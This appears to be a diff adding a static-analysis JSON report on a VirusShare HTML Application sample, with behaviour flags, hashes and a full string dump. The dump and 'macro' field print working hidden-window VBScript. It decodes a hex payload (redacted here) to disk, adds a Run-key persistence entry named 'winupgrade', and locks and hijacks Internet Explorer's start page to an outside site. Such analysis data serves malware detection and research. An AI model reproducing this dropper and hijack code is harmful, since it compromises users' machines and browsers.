@@ -1,0 +1,78 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "Run": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows",
+            "Write": "May write to a file",
+            "chr": "May attempt to obfuscate specific str",
+            "shell": "May run an executable file or a system command"
+        },
+        "macro": " \n\n<html><head>\n<hta:application id=hta_note_id\n applicationName=hta_note_name\n showInTaskBar=no\n caption=no\n innerBorder=no\n selection=no\n scroll=no\n contextmenu=no />\n<script language=javascript>\nwindow.resizeTo(0, 0);\nwindow.moveTo(0, 0);\n</script>\n<SCRIPT language=vbs>\nself.MoveTo 0, 0\n\nprog = xxxxxxxxxxxxxxxxxxxxxxxxxxxx\n\npath = \"c:\\webden.vbs\"\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nSet shell = CreateObject(\"WScript.Shell\")\nSet f = fso.CreateTextFile(path, True)\nh0 = \"\"\ni = 1\n   Do While i < Len(prog)\nh0 = h0 & chr(cint(\"&h\" & mid(prog, i, 2)))\n   i = i + 2\n   Loop\n  f.Write (h0)\nf.Close\n  shell.regwrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\winupgrade\",\"c:\\web.vbs\"\n  shell.regwrite \"HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\\\HomePage\",\"00000001\",\"REG_DWORD\"\n  shell.regwrite \"HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\\\HomePage\",\"00000001\",\"REG_DWORD\"\n  shell.regwrite \"HKCU\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\\\Start Page\", \"http://www.akmerkez.tr.cx/\",\"REG_SZ\"\n  shell.regwrite \"HKLM\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\\\Start Page\", \"http://www.akmerkez.tr.cx/\",\"REG_SZ\"\nself.Close\n</SCRIPT><script type='text/javascript' src='/pop.js'></script><script type='text/javascript' src='/pop.js'></script>"
+    },
+    "filename": "VirusShare_1c3d52b09f906c267f31ce63f60c49d3",
+    "filesize": 1342,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "1c3d52b09f906c267f31ce63f60c49d3",
+        "sha1": "373e3de507542c2059c9611e1d639f16944e10c3",
+        "sha256": "26db4805fa50146df52e3e18c0099ea330cd2852d937205a3921c3d80fab54c7"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<html><head>",
+            "<hta:application id=hta_note_id",
+            " applicationName=hta_note_name",
+            " showInTaskBar=no",
+            " caption=no",
+            " innerBorder=no",
+            " selection=no",
+            " scroll=no",
+            " contextmenu=no />",
+            "<script language=javascript>",
+            "window.resizeTo(0, 0);",
+            "window.moveTo(0, 0);",
+            "</script>",
+            "<SCRIPT language=vbs>",
+            "self.MoveTo 0, 0",
+            "prog = xxxxxxxxxxxxxxxxxxxxxxxxxxxx",
+            "path = \"c:\\webden.vbs\"",
+            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
+            "Set shell = CreateObject(\"WScript.Shell\")",
+            "Set f = fso.CreateTextFile(path, True)",
+            "h0 = \"\"",
+            "i = 1",
+            "   Do While i < Len(prog)",
+            "h0 = h0 & chr(cint(\"&h\" & mid(prog, i, 2)))",
+            "   i = i + 2",
+            "   Loop",
+            "  f.Write (h0)",
+            "f.Close",
+            "  shell.regwrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\winupgrade\",\"c:\\web.vbs\"",
+            "  shell.regwrite \"HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\\\HomePage\",\"00000001\",\"REG_DWORD\"",
+            "  shell.regwrite \"HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\\\HomePage\",\"00000001\",\"REG_DWORD\"",
+            "  shell.regwrite \"HKCU\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\\\Start Page\", \"http://www.akmerkez.tr.cx/\",\"REG_SZ\"",
+            "  shell.regwrite \"HKLM\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\\\Start Page\", \"http://www.akmerkez.tr.cx/\",\"REG_SZ\"",
+            "self.Close",
+            "</SCRIPT><script type='text/javascript' src='/pop.js'></script><script type='text/javascript' src='/pop.js'></script>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.akmerkez.tr.cx/"
+        ]
+    },
+    "time": "0:00:00.259238",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
